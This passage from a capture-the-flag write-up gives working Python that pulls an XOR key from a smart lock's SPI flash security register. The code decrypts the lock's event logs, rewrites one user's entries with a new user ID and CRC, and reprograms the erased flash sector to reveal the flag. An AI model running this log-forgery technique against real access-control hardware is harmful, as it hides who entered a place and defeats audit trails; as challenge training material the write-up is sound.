</span></span><span class="line"><span class="cl">        <span class="n">event_logs</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">event_log</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s1">&#39;---&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The script iterates through encrypted logs, moving <code>0x10</code> bytes at a time (since each log, including CRC32, is <code>0x10</code> bytes long), decrypting them with the key. Logs from <code>event_logs[156]</code> to <code>event_logs[159]</code> were identified as the <code>user 0x5244</code>&rsquo;s entries logs and needed to be changed.</p>
<p>Changing these logs was relatively simple with the encryption key. The script below was used for constructing the altered data:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="c1"># Notes that later, we need to erase the whole sector of spiflash (4096 bytes)</span>
</span></span><span class="line"><span class="cl"><span class="c1"># before we can overwrite the event_log of user id 0x5244.</span>
</span></span><span class="line"><span class="cl"><span class="c1"># So, let&#39;s recover the data first.</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Read raw data 160 * 0x10 starting from address 0</span>
</span></span><span class="line"><span class="cl"><span class="n">raw_data</span> <span class="o">=</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">exchange</span><span class="p">([</span><span class="n">CMD_READ</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">],</span> <span class="mi">160</span><span class="o">*</span><span class="mh">0x10</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># From preious output, we know that data 156-159 contains user_id 0x5244.</span>
</span></span><span class="line"><span class="cl"><span class="c1"># Let&#39;s alter it</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Start constructing new data...&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">altered_data</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">event_idx</span><span class="p">,</span> <span class="n">val</span> <span class="ow">in</span> <span class="n">event_logs</span><span class="o">.</span><span class="n">items</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">val</span><span class="o">.</span><span class="n">user_id</span> <span class="o">=</span> <span class="mh">0x23f</span> <span class="c1"># Change user_id</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># serialize and encrypt</span>
</span></span><span class="line"><span class="cl">    <span class="n">new_data</span> <span class="o">=</span> <span class="n">val</span><span class="o">.</span><span class="n">serialize</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">crc_32_bytes</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">crc32</span><span class="p">(</span><span class="n">new_data</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    <span class="n">enc_data</span> <span class="o">=</span> <span class="n">encrypt</span><span class="p">(</span><span class="n">new_data</span><span class="p">)</span><span class="o">+</span><span class="n">crc_32_bytes</span>
</span></span><span class="line"><span class="cl">    <span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">enc_data</span><span class="p">)</span> <span class="o">==</span> <span class="mh">0x10</span>
</span></span><span class="line"><span class="cl">    <span class="n">altered_data</span><span class="o">+=</span><span class="n">enc_data</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">new_raw_data</span> <span class="o">=</span> <span class="n">raw_data</span><span class="p">[:</span><span class="mi">156</span><span class="o">*</span><span class="mh">0x10</span><span class="p">]</span> <span class="o">+</span> <span class="n">altered_data</span>
</span></span><span class="line"><span class="cl"><span class="k">assert</span> <span class="nb">len</span><span class="p">(</span><span class="n">raw_data</span><span class="p">)</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="n">new_raw_data</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>What I did above is that I encrypted the new event data, appended the original CRC32, and read all the <code>raw_data</code> of the encrypted logs before making any changes.</p>
<p>Reading the whole event data is crucial because the <code>Page Program</code> instruction (Section 8.2.15) only allows writing to previously erased memory locations.</p>
<p>Erasing a memory location involves the <code>Sector Erase</code> instruction (Section 8.2.17), which erases a whole sector (about <code>4096</code> bytes), which means the other logs will be deleted as well. Hence, we need to read all event logs first, so that later after we erases the whole sector, we can write back the encrypted event logs.</p>
<p>After preparing the altered data, the final step was to rewrite the flash memory sector with our crafted data. It&rsquo;s important to use the <code>Write Enable</code> instruction (Section 8.2.1) before each erase or write operation. Combining all these scripts, we will be able to fetch the flag after it finishes. Below is the full script that I used to solve this challenge:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">socket</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">json</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">FLAG_ADDRESS</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">exchange</span><span class="p">(</span><span class="n">hex_list</span><span class="p">,</span> <span class="n">value</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Configure according to your setup</span>
</span></span><span class="line"><span class="cl">    <span class="n">host</span> <span class="o">=</span> <span class="s1">&#39;83.136.252.62&#39;</span>  <span class="c1"># The server&#39;s hostname or IP address</span>
</span></span><span class="line"><span class="cl">    <span class="n">port</span> <span class="o">=</span> <span class="mi">49500</span>        <span class="c1"># The port used by the server</span>
</span></span><span class="line"><span class="cl">    <span class="n">cs</span><span class="o">=</span><span class="mi">0</span> <span class="c1"># /CS on A*BUS3 (range: A*BUS3 to A*BUS7)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">usb_device_url</span> <span class="o">=</span> <span class="s1">&#39;ftdi://ftdi:2232h/1&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># Convert hex list to strings and prepare the command data</span>
</span></span><span class="line"><span class="cl">    <span class="n">command_data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;tool&#34;</span><span class="p">:</span> <span class="s2">&#34;pyftdi&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;cs_pin&#34;</span><span class="p">:</span>  <span class="n">cs</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;url&#34;</span><span class="p">:</span>  <span class="n">usb_device_url</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;data_out&#34;</span><span class="p">:</span> <span class="p">[</span><span class="nb">hex</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="n">hex_list</span><span class="p">],</span>  <span class="c1"># Convert hex numbers to hex strings</span>
</span></span><span class="line"><span class="cl">        <span class="s2">&#34;readlen&#34;</span><span class="p">:</span> <span class="n">value</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span> <span class="k">as</span> <span class="n">s</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span> <span class="n">port</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1"># Serialize data to JSON and send</span>
</span></span><span class="line"><span class="cl">        <span class="n">s</span><span class="o">.</span><span class="n">sendall</span><span class="p">(</span><span class="n">json</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">command_data</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        
</span></span><span class="line"><span class="cl">        <span class="c1"># Receive and process response</span>
</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">data</span> <span class="o">+=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">data</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;]&#39;</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="k">break</span>
</span></span><span class="line"><span class="cl">                
</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">data</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">        <span class="c1">#print(f&#34;Received: {response}&#34;)</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">response</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># SOLVER</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="n">p32</span><span class="p">,</span> <span class="n">u32</span><span class="p">,</span> <span class="n">p16</span><span class="p">,</span> <span class="n">u16</span><span class="p">,</span> <span class="n">p8</span><span class="p">,</span> <span class="n">u8</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">zlib</span> <span class="kn">import</span> <span class="n">crc32</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">datetime</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">EventLog</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">timestamp</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">event_type</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">user_id</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">method</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">status</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">timestamp</span><span class="p">,</span> <span class="n">event_type</span><span class="p">,</span> <span class="n">user_id</span><span class="p">,</span> <span class="n">method</span><span class="p">,</span> <span class="n">status</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">timestamp</span> <span class="o">=</span> <span class="n">timestamp</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">event_type</span> <span class="o">=</span> <span class="n">event_type</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">user_id</span> <span class="o">=</span> <span class="n">user_id</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">method</span> <span class="o">=</span> <span class="n">method</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="o">.</span><span class="n">status</span> <span class="o">=</span> <span class="n">status</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">out</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;&#39;&#39;
</span></span></span><span class="line"><span class="cl"><span class="s1">        timestamp : </span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">timestamp</span><span class="si">}</span><span class="s1"> (</span><span class="si">{</span><span class="n">datetime</span><span class="o">.</span><span class="n">fromtimestamp</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">timestamp</span><span class="p">)</span><span class="si">}</span><span class="s1">)
</span></span></span><span class="line"><span class="cl"><span class="s1">        event_type: </span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">event_type</span><span class="si">}</span><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">        user_id   : </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">user_id</span><span class="p">)</span><span class="si">}</span><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">        method    : </span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">method</span><span class="si">}</span><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">        status    : </span><span class="si">{</span><span class="bp">self</span><span class="o">.</span><span class="n">status</span><span class="si">}</span><span class="s1">
</span></span></span><span class="line"><span class="cl"><span class="s1">        &#39;&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">serialize</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">p32</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">timestamp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p16</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">event_type</span><span class="p">)</span> <span class="o">+</span> <span class="n">p16</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">user_id</span><span class="p">)</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">method</span><span class="p">)</span> <span class="o">+</span> <span class="n">p8</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">status</span><span class="p">)</span> <span class="o">+</span> <span class="n">p16</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># COMMANDS</span>
</span></span><span class="line"><span class="cl"><span class="n">CMD_READ_SEC_REG</span> <span class="o">=</span> <span class="mh">0x48</span>
</span></span><span class="line"><span class="cl"><span class="n">CMD_READ</span> <span class="o">=</span> <span class="mh">0x3</span>
</span></span><span class="line"><span class="cl"><span class="n">CMD_WRITE_ENABLE</span> <span class="o">=</span> <span class="mh">0x6</span>
</span></span><span class="line"><span class="cl"><span class="n">CMD_SECTOR_ERASE</span> <span class="o">=</span> <span class="mh">0x20</span>
</span></span><span class="line"><span class="cl"><span class="n">CMD_PAGE_PROGRAM</span> <span class="o">=</span> <span class="mh">0x02</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">KEY_SIZE</span> <span class="o">=</span> <span class="mi">12</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Helper</span>
</span></span><span class="line"><span class="cl"><span class="c1"># read_data format: addr is array of 3 bytes, size is int</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read_data</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="n">size</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">exchange</span><span class="p">([</span><span class="n">CMD_READ</span><span class="p">]</span><span class="o">+</span><span class="n">addr</span><span class="p">,</span> <span class="n">size</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Example command</span>
</span></span><span class="line"><span class="cl"><span class="n">jedec_id</span> <span class="o">=</span> <span class="n">exchange</span><span class="p">([</span><span class="mh">0x9F</span><span class="p">],</span> <span class="mi">3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;jedec_id = </span><span class="si">{</span><span class="nb">bytes</span><span class="p">(</span><span class="n">jedec_id</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Print flag (This will return 0xFFFFFFFFF because we haven&#39;t altered the log yet)</span>
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="n">read_data</span><span class="p">(</span><span class="n">FLAG_ADDRESS</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;</span><span class="si">{</span><span class="n">flag</span> <span class="si">= }</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Do read_security_register(1, 0x52, KEY_SIZE)</span>
</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="n">exchange</span><span class="p">([</span><span class="n">CMD_READ_SEC_REG</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x01</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">],</span> <span class="mi">12</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;key = </span><span class="si">{</span><span class="nb">bytes</span><span class="p">(</span><span class="n">key</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Define decrypt and encrypt functions</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decrypt</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">dec_data</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">        <span class="n">dec_data</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">^</span><span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="o">%</span><span class="n">KEY_SIZE</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">dec_data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">enc_data</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">        <span class="n">enc_data</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">^</span><span class="n">key</span><span class="p">[</span><span class="n">i</span><span class="o">%</span><span class="n">KEY_SIZE</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">bytes</span><span class="p">(</span><span class="n">enc_data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Convert raw_event_log to EventLog class</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">parse_log</span><span class="p">(</span><span class="n">event_log</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">timestamp</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">event_log</span><span class="p">[:</span><span class="mi">4</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="n">event_type</span> <span class="o">=</span> <span class="n">u16</span><span class="p">(</span><span class="n">event_log</span><span class="p">[</span><span class="mi">4</span><span class="p">:</span><span class="mi">6</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="n">user_id</span> <span class="o">=</span> <span class="n">u16</span><span class="p">(</span><span class="n">event_log</span><span class="p">[</span><span class="mi">6</span><span class="p">:</span><span class="mi">8</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="n">method</span> <span class="o">=</span> <span class="n">u8</span><span class="p">(</span><span class="n">event_log</span><span class="p">[</span><span class="mi">8</span><span class="p">:</span><span class="mi">9</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="n">status</span> <span class="o">=</span> <span class="n">u8</span><span class="p">(</span><span class="n">event_log</span><span class="p">[</span><span class="mi">9</span><span class="p">:</span><span class="mi">10</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">EventLog</span><span class="p">(</span><span class="n">timestamp</span><span class="p">,</span> <span class="n">event_type</span><span class="p">,</span> <span class="n">user_id</span><span class="p">,</span> <span class="n">method</span><span class="p">,</span> <span class="n">status</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Read event_log from spiflash</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read_event_log</span><span class="p">(</span><span class="n">address</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">addr</span> <span class="o">=</span> <span class="p">[</span><span class="n">b</span> <span class="k">for</span> <span class="n">b</span> <span class="ow">in</span> <span class="n">p32</span><span class="p">(</span><span class="n">address</span><span class="p">)[::</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="mi">1</span><span class="p">:]]</span> <span class="c1"># 24 byte</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="c1"># CMD_READ(addr, len)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># sizeof(SmartLockEvent) is 0xc (not 0x9 because of compiler struct padding)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># sizeof(crc32) is 0x4</span>
</span></span><span class="line"><span class="cl">    <span class="n">out</span> <span class="o">=</span> <span class="n">read_data</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="mh">0xc</span><span class="o">+</span><span class="mh">0x4</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">enc_log</span> <span class="o">=</span> <span class="n">out</span><span class="p">[:</span><span class="mh">0xc</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">crc32_log</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">out</span><span class="p">[</span><span class="mh">0xc</span><span class="p">:])</span>
